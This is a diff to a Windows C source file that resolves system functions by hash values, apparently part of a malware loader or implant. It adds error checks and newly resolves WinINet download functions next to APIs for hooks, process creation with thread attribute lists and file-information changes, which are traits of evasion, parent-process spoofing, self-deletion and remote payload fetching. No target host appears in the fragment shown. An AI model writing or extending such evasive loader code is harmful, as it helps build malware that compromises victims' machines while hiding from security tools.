@@ -82,10 +82,13 @@ HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue)
 
 API_HASHING g_Api = { 0 };
 
+// TODO: refactor
 BOOL InitializeWinApis()
 {
 	//	User32.dll exported
 	HMODULE hUser32Dll = GetModuleHandleByHashValue(USER32DLLHashValue);
+	if (hUser32Dll == NULL)
+		return FALSE;
 
 	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
 		hUser32Dll,
@@ -117,6 +120,8 @@ BOOL InitializeWinApis()
 
 	// 	Kernel32.dll exported
 	HMODULE hKernel32Dll = GetModuleHandleByHashValue(KERNEL32DLLHashValue);
+	if (hKernel32Dll == NULL)
+		return FALSE;
 
 	g_Api.pFindResourceW = (fnFindResourceW)GetProcAddressByHashValue(
 		hKernel32Dll,
@@ -163,8 +168,24 @@ BOOL InitializeWinApis()
 		CreateProcessAHashValue
 	);
 
+
+	if (g_Api.pFindResourceW == NULL ||
+		g_Api.pLoadResource == NULL ||
+		g_Api.pLockResource == NULL ||
+		g_Api.pOpenProcess == NULL ||
+		g_Api.pSizeofResource == NULL ||
+		g_Api.pGetModuleFileNameW == NULL ||
+		g_Api.pCreateFileW == NULL ||
+		g_Api.pGetTickCount64 == NULL ||
+		g_Api.pSetFileInformationByHandle == NULL ||
+		g_Api.pGetEnvironmentVariableA == NULL ||
+		g_Api.pCreateProcessA == NULL)
+		return FALSE;
+
 	// Kernelbase.dll exported
 	HANDLE hKernelBaseDll = GetModuleHandleByHashValue(KERNELBASEHashValue);
+	if (hKernelBaseDll == NULL)
+		return FALSE;
 
 	g_Api.pInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList)GetProcAddressByHashValue(
 		hKernelBaseDll,
@@ -179,20 +200,42 @@ BOOL InitializeWinApis()
 		DeleteProcThreadAttributeListHashValue
 	);
 
-	if (g_Api.pFindResourceW == NULL ||
-		g_Api.pLoadResource == NULL ||
-		g_Api.pLockResource == NULL ||
-		g_Api.pOpenProcess == NULL ||
-		g_Api.pSizeofResource == NULL ||
-		g_Api.pGetModuleFileNameW == NULL ||
-		g_Api.pCreateFileW == NULL ||
-		g_Api.pGetTickCount64 == NULL ||
-		g_Api.pSetFileInformationByHandle == NULL ||
-		g_Api.pGetEnvironmentVariableA == NULL ||
-		g_Api.pCreateProcessA == NULL ||
-		g_Api.pInitializeProcThreadAttributeList == NULL ||
+	if (g_Api.pInitializeProcThreadAttributeList == NULL ||
 		g_Api.pUpdateProcThreadAttribute == NULL ||
 		g_Api.pDeleteProcThreadAttributeList == NULL)
+		return FALSE;
+
+	// Wininet.dll exported
+	HMODULE hWininetDll = GetModuleHandleByHashValue(WININETHashValue);
+	if (hWininetDll == NULL)
+		return FALSE;
+
+	g_Api.pInternetOpenW = (fnInternetOpenW)GetProcAddressByHashValue(
+		hWininetDll,
+		InternetOpenWHashValue
+	);
+	g_Api.pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressByHashValue(
+		hWininetDll,
+		InternetOpenUrlWHashValue
+	);
+	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddressByHashValue(
+		hWininetDll,
+		InternetReadFileHashValue
+	);
+	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressByHashValue(
+		hWininetDll,
+		InternetCloseHandleHashValue
+	);
+	g_Api.pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddressByHashValue(
+		hWininetDll,
+		InternetSetOptionWHashValue
+	);
+
+	if (g_Api.pInternetOpenW == NULL ||
+		g_Api.pInternetOpenUrlW == NULL ||
+		g_Api.pInternetReadFile == NULL ||
+		g_Api.pInternetCloseHandle == NULL ||
+		g_Api.pInternetSetOptionW == NULL)
 		return FALSE;
 
 	return TRUE;
